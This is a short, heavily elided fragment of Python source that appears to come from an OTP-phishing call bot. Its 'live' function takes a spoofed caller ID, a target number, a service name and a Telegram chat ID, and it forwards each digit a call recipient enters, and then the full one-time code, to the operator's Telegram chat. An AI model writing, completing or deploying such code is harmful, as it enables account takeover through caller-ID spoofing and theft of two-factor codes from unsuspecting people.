...
async def live(data: dict, module: str, call_variables: str, event: str, channel_id: str, number: str, spoof: str, service: str, name: str, otpdigits: str, chatid: str, tag: str):
    if event == "Dial":
...
#           # LIVE MODULE FUNCTIONALITY           
            await send_telegram_message(chatid, f"🪙 Current Digit: {digit}")
        ...
        await send_telegram_message(chatid, f"Current Digit: {otp_code}")
        ...
        elif len(otp_code) >= int(otpdigits):
            ## CODE IS VALID
